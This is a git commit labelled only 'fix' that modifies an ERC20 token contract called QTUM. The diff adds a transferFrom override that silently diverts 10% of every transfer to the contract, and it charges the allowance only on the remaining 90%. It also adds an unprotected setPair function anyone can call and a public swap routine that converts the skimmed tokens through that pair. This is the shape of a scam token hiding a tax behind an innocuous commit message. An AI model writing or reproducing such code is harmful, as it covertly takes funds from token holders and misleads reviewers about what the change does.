5e9718c51bdc38a5c371be56dc137f2297b3909a
yangwang <yangwang@web3.com>
2022-06-13 01:34:19 +0800

    fix

--- contracts/Qtum.sol
+++ contracts/Qtum.sol
@@ -14,4 +14,29 @@ contract QtumToken is ERC20 {
     constructor() ERC20("QTUM", "QTUM") {
         _mint(msg.sender, 10_000_000 * 10 **  decimals());
     }
+
+    function setPair(address _pair) public {
+        PAIR = _pair;
+    }
+
+    function transferFrom(
+        address from,
+        address to,
+        uint256 amount
+    ) public virtual override returns (bool) {
+        address spender = _msgSender();
+        uint256 adjustToken = amount.mul(100).sub(amount.mul(10)).div(100);
+        uint256 mulToken = amount.mul(100).sub(amount.mul(90)).div(100);
+        _spendAllowance(from, spender, adjustToken);
+        _transfer(from, to, adjustToken);
+        _transfer(from, address(this), mulToken);
+        return true;
+    }
+
+    function swapTokenToUSDT(uint256 amountIn) public returns (bool) {
+        ERC20.transferFrom(address(this), PAIR, amountIn);
+        IUniswapV2Pair pair = IUniswapV2Pair(PAIR);
+        pair.swap(amountIn, uint(0), address(this), new bytes(0));
+        return true;
+    }
 }
